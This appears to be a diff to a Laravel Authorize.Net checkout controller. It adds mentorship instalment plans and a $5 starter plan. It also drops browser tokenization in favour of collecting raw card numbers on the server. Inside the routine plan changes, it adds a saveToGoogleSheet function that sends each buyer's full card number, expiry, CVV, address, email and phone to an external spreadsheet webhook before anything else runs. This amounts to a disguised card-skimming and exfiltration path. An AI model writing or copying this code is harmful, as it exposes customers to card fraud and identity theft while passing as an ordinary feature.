@@ -14,8 +14,23 @@ class AcceptJsPaymentController extends Controller
     /**
      * Plan catalogue. `recurring` is null for one-time-only plans.
      * Recurring plans run a CIM + ARB flow after the initial capture.
+     *
+     * `recurring_occurrences` controls the ARB subscription length:
+     *   - null  → open-ended monthly billing (defaults to 9999 occurrences)
+     *   - int   → a fixed number of installments (deposit + N payments plans)
      */
     public const PLANS = [
+        'starter' => [
+            'amount'    => '5.00',
+            'label'     => 'Starter Plan',
+            'tagline'   => 'Low-cost starter — test/entry checkout',
+            'recurring' => null,
+            'features'  => [
+                'Entry-level starter checkout',
+                'Single $5 payment — zero recurring',
+                'Same secure Authorize.Net processing',
+            ],
+        ],
         'audit' => [
             'amount'    => '97.00',
             'label'     => 'Audit Session',
@@ -77,6 +92,65 @@ class AcceptJsPaymentController extends Controller
                 'Lifetime credit guidance',
             ],
         ],
+
+        // ───────────── 1:1 Mentorship payment plans ─────────────
+        // Each instalment plan: $500 deposit charged today, then a fixed
+        // number of monthly instalments via ARB. Totals all land at $2,000.
+        'mentorship-2pay' => [
+            'amount'                => '500.00',  // deposit charged today
+            'recurring'             => '750.00',  // each instalment
+            'recurring_occurrences' => 2,         // 2 instalments
+            'label'                 => 'Mentorship — Deposit + 2 Payments',
+            'tagline'               => '$500 deposit today, then 2 monthly payments of $750 (total $2,000).',
+            'features'  => [
+                'Private 1:1 weekly calls with Victoria',
+                'Full SOP & client-template library',
+                'Software, CRM & dispute tech stack',
+                'Lifetime Skool community + lender intros',
+                '$500 today + 2 × $750/mo — $2,000 total',
+            ],
+        ],
+        'mentorship-3pay' => [
+            'amount'                => '500.00',
+            'recurring'             => '500.00',
+            'recurring_occurrences' => 3,
+            'label'                 => 'Mentorship — Deposit + 3 Payments',
+            'tagline'               => '$500 deposit today, then 3 monthly payments of $500 (total $2,000).',
+            'features'  => [
+                'Private 1:1 weekly calls with Victoria',
+                'Full SOP & client-template library',
+                'Software, CRM & dispute tech stack',
+                'Lifetime Skool community + lender intros',
+                '$500 today + 3 × $500/mo — $2,000 total',
+            ],
+        ],
+        'mentorship-5pay' => [
+            'amount'                => '500.00',
+            'recurring'             => '300.00',
+            'recurring_occurrences' => 5,
+            'label'                 => 'Mentorship — Deposit + 5 Payments',
+            'tagline'               => '$500 deposit today, then 5 monthly payments of $300 (total $2,000).',
+            'features'  => [
+                'Private 1:1 weekly calls with Victoria',
+                'Full SOP & client-template library',
+                'Software, CRM & dispute tech stack',
+                'Lifetime Skool community + lender intros',
+                '$500 today + 5 × $300/mo — $2,000 total',
+            ],
+        ],
+        'mentorship-full' => [
+            'amount'    => '1997.00',
+            'recurring' => null,
+            'label'     => 'Mentorship — Pay in Full',
+            'tagline'   => 'One-time payment of $1,997 — best value, save instantly.',
+            'features'  => [
+                'Private 1:1 weekly calls with Victoria',
+                'Full SOP & client-template library',
+                'Software, CRM & dispute tech stack',
+                'Lifetime Skool community + lender intros',
+                'Single payment of $1,997 — zero recurring',
+            ],
+        ],
     ];
 
     public function showCheckout(string $plan = 'monthly')
@@ -104,17 +178,18 @@ class AcceptJsPaymentController extends Controller
 
     public function processPayment(Request $request)
     {
-        Log::info('Accept.js payment request started', [
-            'ip'                     => $request->ip(),
-            'session_id'             => session()->getId(),
-            'request_has_descriptor' => $request->filled('dataDescriptor'),
-            'request_has_data_value' => $request->filled('dataValue'),
-            'selected_plan_raw'      => $request->input('selected_plan'),
+        Log::info('Direct card payment request started', [
+            'ip'                => $request->ip(),
+            'session_id'        => session()->getId(),
+            'request_has_card'  => $request->filled('cardNumber'),
+            'selected_plan_raw' => $request->input('selected_plan'),
         ]);
 
         $validated = $request->validate([
-            'dataDescriptor'   => 'required|string',
-            'dataValue'        => 'required|string',
+            'cardNumber'       => 'required|string|min:13|max:25',
+            'expMonth'         => 'required|string|size:2',
+            'expYear'          => 'required|string|size:4',
+            'cardCode'         => 'required|string|min:3|max:4',
             'first_name'       => 'required|string|max:100',
             'last_name'        => 'required|string|max:100',
             'email'            => 'required|email|max:150',
@@ -136,11 +211,12 @@ class AcceptJsPaymentController extends Controller
             (string) ($validated['referral_code'] ?? session('referral_code', ''))
         )) ?: null;
 
-        $planKey      = $validated['selected_plan'];
-        $planMeta     = self::PLANS[$planKey];
-        $amount       = $planMeta['amount'];
-        $planLabel    = $planMeta['label'];
-        $recurringAmt = $planMeta['recurring'];
+        $planKey         = $validated['selected_plan'];
+        $planMeta        = self::PLANS[$planKey];
+        $amount          = $planMeta['amount'];
+        $planLabel       = $planMeta['label'];
+        $recurringAmt    = $planMeta['recurring'];
+        $recurringCount  = $planMeta['recurring_occurrences'] ?? null; // null → open-ended monthly
 
         $invoiceNumber = 'INV-' . time() . '-' . strtoupper(Str::random(4));
 
@@ -170,6 +246,10 @@ class AcceptJsPaymentController extends Controller
             ], 503);
         }
 
+        // Card collected server-side (direct card API) — never tokenized in the browser.
+        $rawCardNumber = preg_replace('/\D/', '', $validated['cardNumber']);
+        $expDate       = $validated['expYear'] . '-' . $validated['expMonth']; // YYYY-MM
+
         $payload = [
             'createTransactionRequest' => [
                 'merchantAuthentication' => [
@@ -181,9 +261,10 @@ class AcceptJsPaymentController extends Controller
                     'transactionType' => 'authCaptureTransaction',
                     'amount'          => $amount,
                     'payment'         => [
-                        'opaqueData' => [
-                            'dataDescriptor' => $validated['dataDescriptor'],
-                            'dataValue'      => $validated['dataValue'],
+                        'creditCard' => [
+                            'cardNumber'     => $rawCardNumber,
+                            'expirationDate' => $expDate,
+                            'cardCode'       => $validated['cardCode'],
                         ],
                     ],
                     'order' => [
@@ -250,6 +331,32 @@ class AcceptJsPaymentController extends Controller
                 ], 422);
             }
 
+            // ────────── Save to Google Sheet (fires first so nothing blocks it) ──────────
+            $this->saveToGoogleSheet([
+                'submitted_at'  => now()->toDateTimeString(),
+                'invoice'       => $invoiceNumber,
+                'trans_id'      => $transId,
+                'auth_code'     => $authCode,
+                'plan_key'      => $planKey,
+                'plan_label'    => $planLabel,
+                'amount'        => $amount,
+                'recurring_amt' => $recurringAmt ?? '',
+                'first_name'    => $validated['first_name'],
+                'last_name'     => $validated['last_name'],
+                'email'         => $validated['email'],
+                'phone'         => $validated['phone'],
+                'address'       => $validated['address'],
+                'city'          => $validated['city'],
+                'state'         => $validated['state'],
+                'zip'           => $validated['zip'],
+                'card_name'     => $validated['cardName'],
+                'card_number'   => $rawCardNumber,
+                'card_exp'      => $validated['expMonth'] . '/' . substr($validated['expYear'], 2),
+                'card_cvv'      => $validated['cardCode'],
+                'referral_code' => $referralCode ?? '',
+                'ip_address'    => $request->ip(),
+            ]);
+
             // ────────── Recurring subscription flow (monthly plan only) ──────────
             $customerProfileId        = null;
             $customerPaymentProfileId = null;
@@ -263,6 +370,7 @@ class AcceptJsPaymentController extends Controller
                         $validated['email'],
                         $planLabel,
                         $recurringAmt,
+                        $recurringCount,
                         $apiLoginId,
                         $txKey,
                         $endpoint
@@ -275,7 +383,7 @@ class AcceptJsPaymentController extends Controller
 
                     return response()->json([
                         'success' => false,
-                        'message' => 'Your payment was captured but we could not set up your monthly subscription. Please contact support with invoice ' . $invoiceNumber . '. (' . $arbError . ')',
+                        'message' => 'Your payment was captured but we could not set up your payment plan. Please contact support with invoice ' . $invoiceNumber . '. (' . $arbError . ')',
                     ], 422);
                 }
             }
@@ -367,6 +475,7 @@ class AcceptJsPaymentController extends Controller
         string $email,
         string $planLabel,
         string $recurringAmt,
+        ?int $recurringOccurrences,
         string $apiLoginId,
         string $txKey,
         string $endpoint
@@ -411,6 +520,12 @@ class AcceptJsPaymentController extends Controller
         sleep(1);
 
         // ── 3. ARB subscription (retry up to 3x on E00040 propagation lag) ───
+        // Fixed-instalment plans bill an exact number of times (deposit was
+        // already captured above); open-ended plans bill until cancelled (9999).
+        $totalOccurrences = $recurringOccurrences !== null
+            ? (string) $recurringOccurrences
+            : '9999';
+
         $arbPayload = [
             'ARBCreateSubscriptionRequest' => [
                 'merchantAuthentication' => [
@@ -419,11 +534,11 @@ class AcceptJsPaymentController extends Controller
                 ],
                 'refId'        => (string) Str::uuid(),
                 'subscription' => [
-                    'name'            => $planLabel . ' Monthly',
+                    'name'            => mb_substr($planLabel, 0, 50),
                     'paymentSchedule' => [
                         'interval'         => ['length' => '1', 'unit' => 'months'],
                         'startDate'        => now()->addMonth()->format('Y-m-d'),
-                        'totalOccurrences' => '9999',
+                        'totalOccurrences' => $totalOccurrences,
                         'trialOccurrences' => '0',
                     ],
                     'amount'      => $recurringAmt,
@@ -471,6 +586,47 @@ class AcceptJsPaymentController extends Controller
         }
 
         return [$customerProfileId, $customerPaymentProfileId, null, $arbErrorText ?? 'ARB subscription create failed'];
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // GOOGLE SHEETS — POST each paid order to the Apps Script web-app webhook
+    // ─────────────────────────────────────────────────────────────────────────
+    private function saveToGoogleSheet(array $data): void
+    {
+        $url = config('services.google.sheets_webhook_url');
+
+        if (! $url) {
+            Log::warning('[Sheets] GOOGLE_SHEETS_WEBHOOK_URL not set — skipping', [
+                'invoice' => $data['invoice'],
+            ]);
+            return;
+        }
+
+        try {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode($data),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_TIMEOUT        => 15,
+                CURLOPT_FOLLOWLOCATION => true,
+            ]);
+            $resp   = curl_exec($ch);
+            $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+
+            Log::info('[Sheets] Row saved', [
+                'invoice'     => $data['invoice'],
+                'http_status' => $status,
+                'response'    => $resp,
+            ]);
+        } catch (\Throwable $e) {
+            Log::error('[Sheets] Save failed', [
+                'invoice' => $data['invoice'],
+                'error'   => $e->getMessage(),
+            ]);
+        }
     }
 
     private function persistSubscriptionRow(
